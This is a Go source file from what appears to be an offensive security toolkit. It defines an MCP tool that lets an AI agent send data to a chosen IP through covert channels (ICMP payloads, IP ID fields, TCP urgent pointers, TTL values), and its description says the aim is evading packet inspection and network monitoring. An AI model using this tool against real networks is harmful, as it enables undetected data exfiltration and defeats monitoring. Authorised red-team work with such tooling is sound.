package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type CovertChannelInput struct {
	Type string `json:"type,omitempty"`
	Dest string `json:"dest,omitempty"`
	Data string `json:"data,omitempty"`
}

type CovertChannelTool struct {
	exec executor.Executor
}

func NewCovertChannel(exec executor.Executor) *CovertChannelTool {
	return &CovertChannelTool{exec: exec}
}

func (t *CovertChannelTool) Name() string { return "kubedagger_covert_channel" }

func (t *CovertChannelTool) Description() string {
	return "Establish covert communication channels using protocol steganography. Encodes data in ICMP payloads, IP ID fields, TCP urgent pointers, or TTL values to bypass deep packet inspection and network monitoring."
}

func (t *CovertChannelTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"type": {
				"type": "string",
				"enum": ["icmp", "ipid", "urgent", "ttl"],
				"description": "Covert channel encoding type (default: icmp)"
			},
			"dest": {
				"type": "string",
				"description": "Destination IP address for the covert channel"
			},
			"data": {
				"type": "string",
				"description": "Data to send through the covert channel"
			}
		}
	}`)
}

func (t *CovertChannelTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CovertChannelInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateIP(input.Dest); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"covert-channel"}
	if input.Type != "" {
		args = append(args, "--type", input.Type)
	}
	if input.Dest != "" {
		args = append(args, "--dest", input.Dest)
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger covert-channel failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	channelType := input.Type
	if channelType == "" {
		channelType = "icmp"
	}
	fmt.Fprintf(&sb, "## KubeDagger Covert Channel: %s\n\n", channelType)
	if output == "" {
		sb.WriteString("Channel established.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
